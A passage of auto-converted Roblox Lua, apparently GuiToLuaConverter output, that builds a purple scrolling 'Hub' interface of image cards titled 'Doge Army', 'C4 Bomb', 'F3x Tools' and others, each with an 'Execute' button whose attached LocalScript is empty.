G2L["44"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["44"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["45"] = Instance.new("UIStroke", G2L["44"]);
G2L["45"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["45"]["Thickness"] = 1.3;
G2L["45"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["46"] = Instance.new("ImageLabel", G2L["44"]);
G2L["46"]["BorderSizePixel"] = 0;
G2L["46"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["46"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["46"]["Image"] = [[rbxassetid://98893207641774]];
G2L["46"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["46"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["46"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["47"] = Instance.new("UICorner", G2L["46"]);
G2L["47"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["48"] = Instance.new("UIGradient", G2L["46"]);
G2L["48"]["Rotation"] = 90;
G2L["48"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["49"] = Instance.new("TextButton", G2L["44"]);
G2L["49"]["BorderSizePixel"] = 0;
G2L["49"]["TextSize"] = 22;
G2L["49"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["49"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["49"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["49"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["49"]["Text"] = [[Execute]];
G2L["49"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["4a"] = Instance.new("LocalScript", G2L["49"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["4b"] = Instance.new("UICorner", G2L["49"]);
G2L["4b"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["4c"] = Instance.new("UICorner", G2L["44"]);
G2L["4c"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["4d"] = Instance.new("TextLabel", G2L["44"]);
G2L["4d"]["BorderSizePixel"] = 0;
G2L["4d"]["TextSize"] = 32;
G2L["4d"]["TextTransparency"] = 0.49;
G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d"]["BackgroundTransparency"] = 1;
G2L["4d"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d"]["Text"] = [[Doge Army]];
G2L["4d"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["4e"] = Instance.new("Frame", G2L["2d"]);
G2L["4e"]["BorderSizePixel"] = 0;
G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["4e"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["4e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["4f"] = Instance.new("UIStroke", G2L["4e"]);
G2L["4f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4f"]["Thickness"] = 1.3;
G2L["4f"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["50"] = Instance.new("ImageLabel", G2L["4e"]);
G2L["50"]["BorderSizePixel"] = 0;
G2L["50"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["50"]["Image"] = [[rbxassetid://112198609303505]];
G2L["50"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["50"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["51"] = Instance.new("UICorner", G2L["50"]);
G2L["51"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["52"] = Instance.new("UIGradient", G2L["50"]);
G2L["52"]["Rotation"] = 90;
G2L["52"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["53"] = Instance.new("TextButton", G2L["4e"]);
G2L["53"]["BorderSizePixel"] = 0;
G2L["53"]["TextSize"] = 22;
G2L["53"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["53"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["53"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["53"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["53"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["53"]["Text"] = [[Execute]];
G2L["53"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["54"] = Instance.new("LocalScript", G2L["53"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["55"] = Instance.new("UICorner", G2L["53"]);
G2L["55"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["56"] = Instance.new("UICorner", G2L["4e"]);
G2L["56"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["57"] = Instance.new("TextLabel", G2L["4e"]);
G2L["57"]["BorderSizePixel"] = 0;
G2L["57"]["TextSize"] = 32;
G2L["57"]["TextTransparency"] = 0.49;
G2L["57"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["57"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["57"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["57"]["BackgroundTransparency"] = 1;
G2L["57"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["Text"] = [[Dark Vex]];
G2L["57"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["58"] = Instance.new("Frame", G2L["2d"]);
G2L["58"]["BorderSizePixel"] = 0;
G2L["58"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["58"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["58"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["58"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["59"] = Instance.new("UIStroke", G2L["58"]);
G2L["59"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["59"]["Thickness"] = 1.3;
G2L["59"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["5a"] = Instance.new("ImageLabel", G2L["58"]);
G2L["5a"]["BorderSizePixel"] = 0;
G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5a"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["5a"]["Image"] = [[rbxassetid://102024442717579]];
G2L["5a"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["5a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5a"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["5b"] = Instance.new("UICorner", G2L["5a"]);
G2L["5b"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["5c"] = Instance.new("UIGradient", G2L["5a"]);
G2L["5c"]["Rotation"] = 90;
G2L["5c"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["5d"] = Instance.new("TextButton", G2L["58"]);
G2L["5d"]["BorderSizePixel"] = 0;
G2L["5d"]["TextSize"] = 22;
G2L["5d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5d"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["5d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5d"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["5d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5d"]["Text"] = [[Execute]];
G2L["5d"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["5e"] = Instance.new("LocalScript", G2L["5d"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["5f"] = Instance.new("UICorner", G2L["5d"]);
G2L["5f"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["60"] = Instance.new("UICorner", G2L["58"]);
G2L["60"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["61"] = Instance.new("TextLabel", G2L["58"]);
G2L["61"]["BorderSizePixel"] = 0;
G2L["61"]["TextSize"] = 32;
G2L["61"]["TextTransparency"] = 0.49;
G2L["61"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["61"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["61"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["61"]["BackgroundTransparency"] = 1;
G2L["61"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["61"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["61"]["Text"] = [[R6]];
G2L["61"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["62"] = Instance.new("Frame", G2L["2d"]);
G2L["62"]["BorderSizePixel"] = 0;
G2L["62"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["62"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["62"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["62"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["63"] = Instance.new("UIStroke", G2L["62"]);
G2L["63"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["63"]["Thickness"] = 1.3;
G2L["63"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["64"] = Instance.new("ImageLabel", G2L["62"]);
G2L["64"]["BorderSizePixel"] = 0;
G2L["64"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["64"]["Image"] = [[rbxassetid://138885605652898]];
G2L["64"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["64"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["64"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["65"] = Instance.new("UICorner", G2L["64"]);
G2L["65"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["66"] = Instance.new("UIGradient", G2L["64"]);
G2L["66"]["Rotation"] = 90;
G2L["66"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["67"] = Instance.new("TextButton", G2L["62"]);
G2L["67"]["BorderSizePixel"] = 0;
G2L["67"]["TextSize"] = 22;
G2L["67"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["67"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["67"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["67"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["67"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["67"]["Text"] = [[Execute]];
G2L["67"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["68"] = Instance.new("LocalScript", G2L["67"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["69"] = Instance.new("UICorner", G2L["67"]);
G2L["69"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["6a"] = Instance.new("UICorner", G2L["62"]);
G2L["6a"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["6b"] = Instance.new("TextLabel", G2L["62"]);
G2L["6b"]["BorderSizePixel"] = 0;
G2L["6b"]["TextSize"] = 32;
G2L["6b"]["TextTransparency"] = 0.49;
G2L["6b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6b"]["BackgroundTransparency"] = 1;
G2L["6b"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["6b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6b"]["Text"] = [[C4 Bomb]];
G2L["6b"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["6c"] = Instance.new("Frame", G2L["2d"]);
G2L["6c"]["BorderSizePixel"] = 0;
G2L["6c"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["6c"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["6c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6c"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["6d"] = Instance.new("UIStroke", G2L["6c"]);
G2L["6d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["6d"]["Thickness"] = 1.3;
G2L["6d"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["6e"] = Instance.new("ImageLabel", G2L["6c"]);
G2L["6e"]["BorderSizePixel"] = 0;
G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6e"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["6e"]["Image"] = [[rbxassetid://115530999244225]];
G2L["6e"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["6e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6e"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["6f"] = Instance.new("UICorner", G2L["6e"]);
G2L["6f"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["70"] = Instance.new("UIGradient", G2L["6e"]);
G2L["70"]["Rotation"] = 90;
G2L["70"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["71"] = Instance.new("TextButton", G2L["6c"]);
G2L["71"]["BorderSizePixel"] = 0;
G2L["71"]["TextSize"] = 22;
G2L["71"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["71"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["71"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["71"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["71"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["71"]["Text"] = [[Execute]];
G2L["71"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["72"] = Instance.new("LocalScript", G2L["71"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["73"] = Instance.new("UICorner", G2L["71"]);
G2L["73"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["74"] = Instance.new("UICorner", G2L["6c"]);
G2L["74"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["75"] = Instance.new("TextLabel", G2L["6c"]);
G2L["75"]["BorderSizePixel"] = 0;
G2L["75"]["TextSize"] = 32;
G2L["75"]["TextTransparency"] = 0.49;
G2L["75"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["75"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["75"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["75"]["BackgroundTransparency"] = 1;
G2L["75"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["75"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["75"]["Text"] = [[F3x Tools]];
G2L["75"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["76"] = Instance.new("Frame", G2L["2d"]);
G2L["76"]["BorderSizePixel"] = 0;
G2L["76"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["76"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["76"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["76"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["77"] = Instance.new("UIStroke", G2L["76"]);
G2L["77"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["77"]["Thickness"] = 1.3;
G2L["77"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["78"] = Instance.new("ImageLabel", G2L["76"]);
G2L["78"]["BorderSizePixel"] = 0;
G2L["78"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["78"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["78"]["Image"] = [[rbxassetid://99949640024663]];
G2L["78"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["78"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["78"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["79"] = Instance.new("UICorner", G2L["78"]);
G2L["79"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["7a"] = Instance.new("UIGradient", G2L["78"]);
G2L["7a"]["Rotation"] = 90;
G2L["7a"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["7b"] = Instance.new("TextButton", G2L["76"]);
G2L["7b"]["BorderSizePixel"] = 0;
G2L["7b"]["TextSize"] = 22;
G2L["7b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7b"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["7b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7b"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["7b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7b"]["Text"] = [[Execute]];
G2L["7b"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["7c"] = Instance.new("LocalScript", G2L["7b"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["7d"] = Instance.new("UICorner", G2L["7b"]);
G2L["7d"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["7e"] = Instance.new("UICorner", G2L["76"]);
G2L["7e"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["7f"] = Instance.new("TextLabel", G2L["76"]);
G2L["7f"]["BorderSizePixel"] = 0;
G2L["7f"]["TextSize"] = 32;
G2L["7f"]["TextTransparency"] = 0.49;
G2L["7f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7f"]["BackgroundTransparency"] = 1;
G2L["7f"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["7f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7f"]["Text"] = [[Death Sherif]];
G2L["7f"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["80"] = Instance.new("Frame", G2L["2d"]);
G2L["80"]["BorderSizePixel"] = 0;
G2L["80"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["80"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["80"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["80"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["81"] = Instance.new("UIStroke", G2L["80"]);
G2L["81"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["81"]["Thickness"] = 1.3;
G2L["81"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["82"] = Instance.new("ImageLabel", G2L["80"]);
G2L["82"]["BorderSizePixel"] = 0;
G2L["82"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["82"]["Image"] = [[rbxassetid://92116086047708]];
G2L["82"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["82"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["82"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["83"] = Instance.new("UICorner", G2L["82"]);
G2L["83"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["84"] = Instance.new("UIGradient", G2L["82"]);
G2L["84"]["Rotation"] = 90;
G2L["84"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["85"] = Instance.new("TextButton", G2L["80"]);
G2L["85"]["BorderSizePixel"] = 0;
G2L["85"]["TextSize"] = 22;
G2L["85"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["85"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["85"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["85"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["85"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["85"]["Text"] = [[Execute]];
G2L["85"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["86"] = Instance.new("LocalScript", G2L["85"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["87"] = Instance.new("UICorner", G2L["85"]);
G2L["87"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["88"] = Instance.new("UICorner", G2L["80"]);
G2L["88"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["89"] = Instance.new("TextLabel", G2L["80"]);
G2L["89"]["BorderSizePixel"] = 0;
G2L["89"]["TextSize"] = 32;
G2L["89"]["TextTransparency"] = 0.49;
G2L["89"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["89"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["89"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["89"]["BackgroundTransparency"] = 1;
G2L["89"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["89"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["89"]["Text"] = [[John Doe]];
G2L["89"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["8a"] = Instance.new("Frame", G2L["2d"]);
G2L["8a"]["BorderSizePixel"] = 0;
G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["8a"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["8a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8a"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["8b"] = Instance.new("UIStroke", G2L["8a"]);
G2L["8b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["8b"]["Thickness"] = 1.3;
G2L["8b"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["8c"] = Instance.new("ImageLabel", G2L["8a"]);
G2L["8c"]["BorderSizePixel"] = 0;
G2L["8c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8c"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["8c"]["Image"] = [[rbxassetid://77063341160612]];
G2L["8c"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["8c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8c"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["8d"] = Instance.new("UICorner", G2L["8c"]);
G2L["8d"]["CornerRadius"] = UDim.new(0, 15);


